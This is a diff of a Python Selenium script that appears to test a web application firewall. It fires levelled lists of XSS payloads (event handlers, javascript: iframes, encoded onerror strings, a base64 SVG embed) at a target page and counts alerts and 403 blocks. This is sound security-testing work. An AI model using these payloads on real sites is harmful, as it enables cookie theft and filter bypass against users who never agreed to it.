@@ -1,8 +1,10 @@
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import WebDriverWait
-from selenium.common.exceptions import TimeoutException
+from selenium.common.exceptions import TimeoutException, ElementClickInterceptedException
 from selenium.common.exceptions import NoSuchElementException
+from selenium.webdriver.common.action_chains import ActionChains
+import time
 
 
 def execute(driver, target_url):
@@ -22,15 +24,12 @@ def implement_attack(driver, target_url):
         """\<a onmouseover="alert(document.cookie)" id="xss"\>XSS\</a\> """,
         """<IFRAME SRC="javascript:alert('XSS');" id="xss"></IFRAME>""",
         """<IFRAME SRC=# onmouseover="alert(document.cookie)" id="xss"></IFRAME>""",
-        """<A HREF="http://172.217.171.206/">XSS</A>""",
-        """<A HREF="http://2899946446/">XSS</A>""",
-        """<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>"""
     ]
     xss_level_3 = [
         """<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>""",
         """<img src=&#0000106 onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041" id="xss">""",
         """<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))" id="xss"></img>""",
-        """<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always" id="xss"></EMBED>"""
+        #"""<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always" id="xss"></EMBED>"""
         """<body onscroll=alert("XSS")><br><br><br><br><br><br>...<br><br><br><br><input autofocus>"""
         """<input onfocus=alert("XSS") autofocus>"""
     ]
@@ -54,6 +53,8 @@ def implement_attack(driver, target_url):
 
     for lvl in all_xss_levels:
         success_counter = 0
+        if lvl == xss_level_3:
+            pass
 
         for payload in lvl:
             driver.get(target_url + attack_url_page)
@@ -62,28 +63,31 @@ def implement_attack(driver, target_url):
 
             # Check for 'alert' box
             try:
-                WebDriverWait(driver, 1).until(EC.alert_is_present())
+                WebDriverWait(driver, 0.1).until(EC.alert_is_present())
                 alert = driver.switch_to.alert
                 alert.accept()
                 success_counter += 1
             except TimeoutException:
                 # look for any element with id="xss", click it and check for 'alert' box
                 try:
-                    driver.find_element_by_id("xss").click()
-                    WebDriverWait(driver, 5).until(EC.alert_is_present())
-                    alert = driver.switch_to.alert
-                    alert.accept()
-                    success_counter += 1
-                except NoSuchElementException:
-                    try:
-                        # Catch WAF Blocking page
-                        waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
-                        if "403 Forbidden" == waf_block_message:
+                    if check_if_element_exists(driver, "id", "xss"):
+                        el = driver.find_element_by_id("xss")
+                        #ActionChains(driver).move_to_element(el).perform()
+                        el.click()
+                        WebDriverWait(driver, 0.1).until(EC.alert_is_present())
+                        alert = driver.switch_to.alert
+                        alert.accept()
+                        success_counter += 1
+                    # Check if attack blocked by waf
+                    elif check_if_element_exists(driver, "xpath", "/html/body/center/h1"):
+                        if "403 Forbidden" == driver.find_element_by_xpath("/html/body/center/h1").text:
                             blocked_by_waf_counter += 1
-                    except NoSuchElementException:
-                        pass
+                except NoSuchElementException:
+                    print("ERROR!")
+                except ElementClickInterceptedException:
+                    pass
 
-        print(f"[+] [Level {str(lvl_counter)}] Successful Attacks:", success_counter)
+        print(f"[+] [Level {str(lvl_counter)}] Successful Attacks: {success_counter}/{len(lvl)}")
         results["lvl " + str(lvl_counter)] = success_counter
         lvl_counter += 1
 
@@ -94,3 +98,20 @@ def implement_attack(driver, target_url):
     print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
     print(f"[+] Total Failed Attacks:", len(xss_level_1+xss_level_2+xss_level_3+xss_level_4) - blocked_by_waf_counter - sum)
 
+
+def check_if_element_exists(driver, find_by, value, get_att=False, att_value=""):
+    try:
+        if find_by == "id":
+            driver.find_element_by_id(value).get_attribute(att_value) if get_att else driver.find_element_by_id(value)
+        elif find_by == "name":
+            driver.find_element_by_name(value).get_attribute(att_value) if get_att != "" else driver.find_element_by_name(value)
+        elif find_by == "tag_name":
+            driver.find_element_by_tag_name(value).get_attribute(att_value) if get_att != "" else driver.find_element_by_tag_name(value)
+        elif find_by == "xpath":
+            driver.find_element_by_xpath(value).get_attribute(att_value) if get_att != "" else driver.find_element_by_xpath(value)
+        else:
+            print("Unknown element name")
+            return False
+        return True
+    except NoSuchElementException:
+        return False
